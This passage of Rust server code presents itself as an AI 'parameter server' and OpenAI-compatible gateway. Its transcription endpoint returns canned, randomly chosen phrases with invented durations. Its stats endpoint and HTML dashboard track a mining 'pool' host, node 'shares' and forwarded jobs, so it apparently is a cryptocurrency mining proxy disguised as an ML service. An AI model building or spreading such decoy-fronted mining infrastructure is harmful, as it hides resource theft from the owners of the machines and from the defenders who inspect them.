        "We need to optimize the inference pipeline for better throughput.",
        "The data preprocessing stage is the current bottleneck in our workflow.",
    ];
    let idx = unix_ts() as usize % phrases.len();
    let resp = json!({
        "text": phrases[idx],
        "task": "transcribe",
        "language": "en",
        "duration": 3.5 + (unix_ts() % 10) as f64 * 0.5
    });
    writer.write_all(&http_json(200, &resp.to_string())).await?;
    Ok(())
}

async fn handle_stats(
    mut writer: tokio::net::tcp::OwnedWriteHalf,
    _auth: &str,
) -> Result<()> {
    let uptime_secs = START_INSTANT.elapsed().as_secs();
    let hours = uptime_secs / 3600;
    let mins = (uptime_secs % 3600) / 60;
    let synced = SYNCED.load(Ordering::Relaxed);
    let errs = SYNC_ERRS.load(Ordering::Relaxed);
    let jobs = JOBS_FORWARDED.load(Ordering::Relaxed);
    let active = NODES_ACTIVE.load(Ordering::Relaxed);
    let total = NODES_TOTAL.load(Ordering::Relaxed);

    let mut nodes_arr = Vec::new();
    if let Ok(ns) = NODE_STATS.lock() {
        for (id, stat) in ns.iter() {
            let node_uptime = stat.connected_at.elapsed().as_secs();
            nodes_arr.push(json!({
                "id": id,
                "uptime_secs": node_uptime,
                "uptime": format!("{}h{:02}m", node_uptime / 3600, (node_uptime % 3600) / 60),
                "last_seen_secs_ago": stat.last_seen.elapsed().as_secs(),
                "shares_submitted": stat.shares_submitted,
                "shares_accepted": stat.shares_accepted,
                "shares_rejected": stat.shares_rejected,
            }));
        }
    }

    let resp = json!({
        "status": "running",
        "version": "3.0.0",
        "uptime": format!("{}h{:02}m", hours, mins),
        "uptime_secs": uptime_secs,
        "pool": {
            "host": default_upstream().split("://").last().unwrap_or("?"),
            "status": if active > 0 { "connected" } else { "idle" },
        },
        "nodes": {
            "active": active,
            "total_connections": total,
            "details": nodes_arr,
        },
        "shares": {
            "accepted": synced,
            "rejected": errs,
            "total": synced + errs,
            "accept_rate": if synced + errs > 0 { format!("{:.1}%", synced as f64 / (synced + errs) as f64 * 100.0) } else { "N/A".to_string() },
        },
        "jobs_forwarded": jobs,
    });
    writer.write_all(&http_json(200, &resp.to_string())).await?;
    Ok(())
}

async fn handle_dashboard(
    mut writer: tokio::net::tcp::OwnedWriteHalf,
    _auth: &str,
) -> Result<()> {
    let html = r##"<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NeuralSync Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a1a;color:#e0e0e0;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;padding:20px}
.header{text-align:center;padding:30px 0;border-bottom:1px solid #1a1a3a}
.header h1{font-size:28px;background:linear-gradient(135deg,#00d4ff,#7c3aed);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:700}
.header .ver{color:#666;font-size:12px;margin-top:4px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px;margin:24px 0}
.card{background:linear-gradient(145deg,#111128,#0d0d22);border:1px solid #1e1e3f;border-radius:12px;padding:20px;transition:transform .2s,border-color .2s}
.card:hover{transform:translateY(-2px);border-color:#7c3aed}
.card .label{color:#888;font-size:12px;text-transform:uppercase;letter-spacing:1px}
.card .value{font-size:32px;font-weight:700;margin:8px 0;background:linear-gradient(135deg,#00d4ff,#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.card .sub{color:#666;font-size:13px}
.status{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
.status.on{background:#22c55e;box-shadow:0 0 8px #22c55e}
.status.off{background:#ef4444;box-shadow:0 0 8px #ef4444}
.table-wrap{margin:24px 0;overflow-x:auto}
table{width:100%;border-collapse:collapse}
th{text-align:left;color:#888;font-size:12px;text-transform:uppercase;letter-spacing:1px;padding:10px 12px;border-bottom:1px solid #1a1a3a}
td{padding:10px 12px;border-bottom:1px solid #111128;font-size:14px}
tr:hover td{background:#111128}
.pulse{animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.footer{text-align:center;color:#444;font-size:11px;margin-top:30px;padding-top:20px;border-top:1px solid #1a1a3a}
</style>
</head>
<body>
<div class="header">
  <h1>NeuralSync Parameter Server</h1>
  <div class="ver">v3.0.0 | OpenAI-Compatible Gateway</div>
</div>
<div id="dash">Loading...</div>
<div class="footer">Auto-refresh: 10s | <span class="pulse">&#9679;</span> Live</div>
<script>
async function refresh() {
  try {
    const r = await fetch('/v1/stats');
    const d = await r.json();
    let h = '<div class="grid">';
    h += card('Uptime', d.uptime, 'Since start');
    h += card('Pool', '<span class="status '+(d.pool.status==='connected'?'on':'off')+'"></span>'+d.pool.status, d.pool.host);
    h += card('Active Nodes', d.nodes.active, d.nodes.total_connections+' total connections');
    h += card('Shares', d.shares.accepted+'/'+d.shares.total, 'Accept rate: '+d.shares.accept_rate);
    h += card('Jobs', d.jobs_forwarded, 'Tasks forwarded');
    h += card('Errors', d.shares.rejected, d.shares.rejected > 0 ? 'Shares rejected' : 'All clear');
    h += '</div>';
    if (d.nodes.details && d.nodes.details.length) {
      h += '<div class="table-wrap"><table><tr><th>Node</th><th>Uptime</th><th>Last Seen</th><th>Submitted</th><th>Accepted</th><th>Rejected</th></tr>';
      d.nodes.details.forEach(function(n) {
        h += '<tr><td>'+n.id+'</td><td>'+n.uptime+'</td><td>'+n.last_seen_secs_ago+'s ago</td><td>'+n.shares_submitted+'</td><td>'+n.shares_accepted+'</td><td>'+n.shares_rejected+'</td></tr>';
      });
      h += '</table></div>';
    }
    document.getElementById('dash').innerHTML = h;
  } catch(e) { console.error(e); }
}
function card(label, value, sub) {
  return '<div class="card"><div class="label">'+label+'</div><div class="value">'+value+'</div><div class="sub">'+sub+'</div></div>';
}
refresh(); setInterval(refresh, 10000);
</script>
</body>
</html>"##;
    let resp = format!(
        "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\nCache-Control: no-cache\r\n{}\r\n{}",
        html.len(), rate_limit_headers(), html
    );
    writer.write_all(resp.as_bytes()).await?;
    Ok(())
}
